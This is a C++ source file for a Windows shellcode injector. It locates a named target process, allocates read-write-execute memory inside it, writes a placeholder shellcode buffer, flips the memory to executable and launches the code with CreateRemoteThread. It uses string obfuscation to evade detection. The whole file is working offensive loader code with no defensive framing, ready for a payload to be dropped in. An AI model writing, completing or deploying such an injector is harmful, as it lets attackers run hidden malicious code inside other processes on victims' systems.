#include <windows.h>
#include <WinInet.h>
#include <iostream>
#include <tlhelp32.h>
#include "obfuscate.h"
#include <vector>
#pragma comment(lib, "Wininet.lib")


DWORD FindProcessId(std::string sProcessName, const std::vector<DWORD>& vIgnoreProcessIds) {
	PROCESSENTRY32 entry;
	std::wstring wProcessTarget(sProcessName.begin(), sProcessName.end());
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (Process32First(snapshot, &entry) == TRUE)
	{
		while (Process32Next(snapshot, &entry) == TRUE)
		{
			if (entry.szExeFile == wProcessTarget) {
				// Check if the process ID is in the ignored vector
				if (std::find(vIgnoreProcessIds.begin(), vIgnoreProcessIds.end(), entry.th32ProcessID) != vIgnoreProcessIds.end()) {
					continue;
				}
				else {
					CloseHandle(snapshot);
					return entry.th32ProcessID;
				}
			}
		}
	}
	return 0;
}

int main()
{
	HANDLE hProcess;
	PVOID pRemoteBufferAddr = NULL;
	std::vector<DWORD> vIgnoredProcessIds = {};
	MEMORY_BASIC_INFORMATION thunkMemInfo;
	unsigned char buffer[] = "<Your shellcode here>";
	std::string sTargetProcess = STR("<Process name you would like to inject to>");
	DWORD dProcessId = FindProcessId(sTargetProcess, vIgnoredProcessIds);
	if (dProcessId == 0)
		exit(1);
	hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, TRUE, dProcessId);
	while (GetLastError() == 5) {
		vIgnoredProcessIds.push_back(dProcessId);
		dProcessId = FindProcessId(sTargetProcess, vIgnoredProcessIds);
		hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, TRUE, dProcessId);
	}
	pRemoteBufferAddr = VirtualAllocEx(hProcess, NULL, sizeof buffer, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	if (pRemoteBufferAddr == NULL) {
		std::cerr << "VirtualAllocEx()" << GetLastError();
		exit(1);
	}
	if (!WriteProcessMemory(hProcess, pRemoteBufferAddr, buffer, sizeof buffer, NULL)) {
		std::cerr << "WriteProcessMemory()" << GetLastError();
		exit(1);
	}
	if (!VirtualProtectEx(hProcess, (LPVOID)pRemoteBufferAddr, sizeof buffer, PAGE_EXECUTE_READ, &thunkMemInfo.Protect)) {
		std::cerr << "VirtualProtextEx()" << GetLastError();
		exit(1);
	}
	CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteBufferAddr, NULL, 0, NULL);
	CloseHandle(hProcess);
	return 0;
}